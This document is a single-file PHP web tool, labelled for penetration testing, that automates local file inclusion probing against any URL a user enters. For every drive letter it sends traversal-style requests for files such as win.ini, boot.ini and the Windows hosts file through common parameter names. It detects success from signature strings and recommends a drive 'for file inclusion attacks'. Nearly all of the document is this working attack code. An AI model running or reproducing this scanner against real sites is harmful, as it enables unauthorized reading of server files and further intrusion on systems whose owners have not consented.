<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Windows Drive Letter Enumeration Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            padding: 40px;
            max-width: 900px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            color: #333;
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(45deg, #667eea, #764ba2);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .header p {
            color: #666;
            font-size: 1.1em;
        }

        .form-section {
            margin-bottom: 30px;
            padding: 25px;
            background: #f8f9ff;
            border-radius: 10px;
            border-left: 4px solid #667eea;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }

        input[type="url"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s ease;
        }

        input[type="url"]:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .submit-btn {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s ease, box-shadow 0.2s ease;
            width: 100%;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .submit-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .results-section {
            margin-top: 30px;
            padding: 25px;
            background: #f0f4f8;
            border-radius: 10px;
            border-left: 4px solid #28a745;
        }

        .results-section h3 {
            color: #333;
            margin-bottom: 15px;
            font-size: 1.3em;
        }

        .drive-result {
            background: white;
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
            border: 1px solid #e1e5e9;
            font-family: 'Courier New', monospace;
        }

        .drive-letter {
            font-size: 1.4em;
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }

        .drive-letter.accessible {
            color: #28a745;
        }

        .status {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: bold;
            margin: 2px;
        }

        .status.exists {
            background: #d4edda;
            color: #155724;
        }

        .status.readable {
            background: #cce5ff;
            color: #004085;
        }

        .status.not-found {
            background: #f8d7da;
            color: #721c24;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .loading.active {
            display: block;
        }

        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 0 auto 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #dc3545;
            margin: 15px 0;
        }

        .warning {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 8px;
            border-left: 4px solid #ffc107;
            margin: 15px 0;
            font-size: 0.9em;
        }

        .summary {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
        }

        .summary h4 {
            color: #155724;
            margin-bottom: 10px;
        }

        .progress {
            background: #e9ecef;
            border-radius: 4px;
            height: 8px;
            margin: 10px 0;
            overflow: hidden;
        }

        .progress-bar {
            background: linear-gradient(45deg, #667eea, #764ba2);
            height: 100%;
            transition: width 0.3s ease;
            width: 0%;
        }
    </style>
</head>
<?php
/**
 * Integrated Windows Drive Letter Enumeration Tool
 * For authorized penetration testing purposes
 * Single file with both frontend and backend functionality
 */

// Handle AJAX requests
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'enumerate') {
    header('Content-Type: application/json');
    
    $targetUrl = isset($_POST['url']) ? trim($_POST['url']) : '';
    
    if (empty($targetUrl)) {
        echo json_encode(['error' => 'URL parameter required']);
        exit;
    }
    
    if (!filter_var($targetUrl, FILTER_VALIDATE_URL)) {
        echo json_encode(['error' => 'Invalid URL format']);
        exit;
    }
    
    try {
        $results = performDriveEnumeration($targetUrl);
        echo json_encode($results);
    } catch (Exception $e) {
        echo json_encode(['error' => 'Enumeration failed: ' . $e->getMessage()]);
    }
    exit;
}

/**
 * Perform drive letter enumeration
 */
function performDriveEnumeration($baseUrl) {
    $results = [];
    $driveLetters = range('A', 'Z');
    $startTime = microtime(true);
    
    foreach ($driveLetters as $letter) {
        $drive = $letter . ':';
        $result = [
            'letter' => $letter,
            'exists' => false,
            'readable' => false,
            'response_time' => null,
            'indicator_found' => null,
            'parameter_used' => null
        ];
        
        // Test common file inclusion payloads
        $testPaths = [
            $drive . '\\Windows\\win.ini',
            $drive . '\\boot.ini',
            $drive . '\\Windows\\System32\\drivers\\etc\\hosts',
            $drive . '\\autoexec.bat',
            $drive . '\\config.sys'
        ];
        
        foreach ($testPaths as $path) {
            $testResult = testFileInclusionPath($baseUrl, $path);
            
            if ($testResult['success']) {
                $result['exists'] = true;
                $result['readable'] = true;
                $result['response_time'] = $testResult['response_time'];
                $result['indicator_found'] = $testResult['indicator'];
                $result['parameter_used'] = $testResult['parameter'];
                break;
            }
        }
        
        $results[] = $result;
        
        // Small delay to avoid overwhelming target
        usleep(100000); // 0.1 seconds
    }
    
    // Find primary accessible drive
    $primaryDrive = null;
    $accessibleDrives = [];
    
    foreach ($results as $drive) {
        if ($drive['readable']) {
            $accessibleDrives[] = $drive['letter'] . ':';
            if ($primaryDrive === null) {
                $primaryDrive = $drive['letter'];
            }
        }
    }
    
    $totalTime = microtime(true) - $startTime;
    
    return [
        'success' => true,
        'target_url' => $baseUrl,
        'scan_time' => round($totalTime, 2),
        'timestamp' => date('Y-m-d H:i:s'),
        'primary_drive' => $primaryDrive,
        'accessible_drives' => $accessibleDrives,
        'total_accessible' => count($accessibleDrives),
        'results' => $results
    ];
}

/**
 * Test file inclusion for a specific path
 */
function testFileInclusionPath($baseUrl, $testPath) {
    $result = [
        'success' => false,
        'response_time' => null,
        'indicator' => null,
        'parameter' => null
    ];
    
    // Common file inclusion parameter names
    $parameters = ['file', 'include', 'page', 'document', 'path', 'template', 'view', 'content'];
    
    foreach ($parameters as $param) {
        $testUrl = $baseUrl . (strpos($baseUrl, '?') === false ? '?' : '&') . $param . '=' . urlencode($testPath);
        
        $startTime = microtime(true);
        
        $context = stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 10,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]
        ]);
        
        $response = @file_get_contents($testUrl, false, $context);
        $responseTime = microtime(true) - $startTime;
        
        if ($response !== false) {
            // Check for indicators that file inclusion worked
            $indicators = [
                '[boot loader]',           // boot.ini
                '; for 16-bit app support', // win.ini
                '# localhost',             // hosts file
                'localhost',               // hosts file
                '[fonts]',                 // win.ini section
                'timeout=',                // boot.ini
                '127.0.0.1',              // hosts file
                '[extensions]',            // win.ini
                'read this before'         // Various system files
            ];
            
            foreach ($indicators as $indicator) {
                if (stripos($response, $indicator) !== false) {
                    return [
                        'success' => true,
                        'response_time' => round($responseTime * 1000, 2),
                        'indicator' => $indicator,
                        'parameter' => $param
                    ];
                }
            }
        }
        
        usleep(50000); // 0.05 seconds between tests
    }
    
    return $result;
}
?>
<body>
    <div class="container">
        <div class="header">
            <h1> Drive Letter Enumeration</h1>
            <p>Windows Drive Discovery Tool</p>
        </div>

        <div class="form-section">
            <form id="enumForm">
                <div class="form-group">
                    <label for="targetUrl">Target URL:</label>
                    <input 
                        type="url" 
                        id="targetUrl" 
                        name="url" 
                        placeholder="https://example.com/vulnerable-page.php"
                        required
                    >
                </div>
                <button type="submit" class="submit-btn" id="submitBtn">
                    Enumerate Drive Letters
                </button>
            </form>
        </div>

        <div class="loading" id="loadingDiv">
            <div class="spinner"></div>
            <p>Enumerating drive letters... This may take a moment.</p>
            <div class="progress">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>

        <div id="resultsSection" style="display: none;">
            <div class="results-section">
                <h3>Enumeration Results</h3>
                <div id="resultsContent"></div>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('enumForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const url = document.getElementById('targetUrl').value;
            const loadingDiv = document.getElementById('loadingDiv');
            const resultsSection = document.getElementById('resultsSection');
            const resultsContent = document.getElementById('resultsContent');
            const submitBtn = document.getElementById('submitBtn');
            const progressBar = document.getElementById('progressBar');
            
            // Show loading state
            loadingDiv.classList.add('active');
            resultsSection.style.display = 'none';
            submitBtn.disabled = true;
            submitBtn.textContent = 'Enumerating...';
            
            // Simulate progress
            let progress = 0;
            const progressInterval = setInterval(() => {
                progress += Math.random() * 10;
                if (progress > 90) progress = 90;
                progressBar.style.width = progress + '%';
            }, 200);
            
            try {
                const formData = new FormData();
                formData.append('action', 'enumerate');
                formData.append('url', url);
                
                const response = await fetch('', {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                clearInterval(progressInterval);
                progressBar.style.width = '100%';
                
                if (data.error) {
                    throw new Error(data.error);
                }
                
                displayResults(data);
                
            } catch (error) {
                clearInterval(progressInterval);
                resultsContent.innerHTML = `
                    <div class="error">
                        <strong>Error:</strong> ${error.message}
                    </div>
                `;
            } finally {
                loadingDiv.classList.remove('active');
                resultsSection.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.textContent = 'Enumerate Drive Letters';
                setTimeout(() => {
                    progressBar.style.width = '0%';
                }, 1000);
            }
        });

        function displayResults(data) {
            const resultsContent = document.getElementById('resultsContent');
            
            let resultsHTML = `
                <div class="summary">
                    <h4>Scan Summary</h4>
                    <strong>Target URL:</strong> ${data.target_url}<br>
                    <strong>Scan Time:</strong> ${data.scan_time} seconds<br>
                    <strong>Completed:</strong> ${data.timestamp}<br>
                    <strong>Accessible Drives:</strong> ${data.total_accessible} found
                </div>
            `;
            
            if (data.primary_drive) {
                resultsHTML += `
                    <div class="drive-result" style="background: #d4edda; border-left: 4px solid #28a745;">
                        <div class="drive-letter accessible">${data.primary_drive}:\\ (Primary Drive)</div>
                        <span class="status readable">ACCESSIBLE</span>
                        <br><small><strong>This appears to be the main accessible drive for further testing.</strong></small>
                    </div>
                `;
            }
            
            // Show all tested drives
            data.results.forEach(drive => {
                let statusHtml = '';
                let extraInfo = '';
                
                if (drive.readable) {
                    statusHtml = '<span class="status exists">EXISTS</span><span class="status readable">ACCESSIBLE</span>';
                    extraInfo = `<br><small>Response time: ${drive.response_time}ms | Parameter: ${drive.parameter_used} | Indicator: "${drive.indicator_found}"</small>`;
                } else if (drive.exists) {
                    statusHtml = '<span class="status exists">EXISTS</span>';
                } else {
                    statusHtml = '<span class="status not-found">NOT ACCESSIBLE</span>';
                }
                
                const driveClass = drive.readable ? 'accessible' : '';
                
                resultsHTML += `
                    <div class="drive-result">
                        <div class="drive-letter ${driveClass}">${drive.letter}:\\</div>
                        ${statusHtml}
                        ${extraInfo}
                    </div>
                `;
            });
            
            if (data.accessible_drives.length > 0) {
                resultsHTML += `
                    <div class="summary">
                        <h4>Accessible Drives Found</h4>
                        <strong>Drives:</strong> ${data.accessible_drives.join(', ')}<br>
                        <strong>Recommendation:</strong> Use <code>${data.primary_drive}:\\</code> as the primary drive letter for file inclusion attacks.
                    </div>
                `;
            } else {
                resultsHTML += `
                    <div class="error">
                        <strong>No accessible drives found.</strong> The target may not be vulnerable to file inclusion, or additional techniques may be required.
                    </div>
                `;
            }
            
            resultsContent.innerHTML = resultsHTML;
        }
    </script>
</body>
</html>
